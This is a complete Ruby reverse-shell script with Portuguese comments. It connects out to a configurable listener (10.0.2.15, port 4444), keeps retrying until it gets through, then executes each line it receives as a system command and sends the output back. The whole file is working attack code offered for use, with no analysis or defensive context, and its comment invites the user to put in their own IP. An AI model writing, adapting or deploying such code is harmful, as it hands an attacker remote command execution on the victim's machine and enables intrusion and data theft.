#!/usr/bin/env ruby
require 'open3'
require 'socket'
puts "Seja bem vindo  <3"
#Mude o lhost para o seu ip <3 
lhost = "10.0.2.15" #Mude -> Change 
porta = 4444 
begin
socket = TCPSocket.new "#{lhost}", "#{porta}"
socket.puts "Conectado  <3 !"
rescue
  sleep 10
  retry
end
begin
  while linha = socket.gets
    Open3.popen2e("#{linha}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, socket)
              end  
  end
rescue
  retry
end 
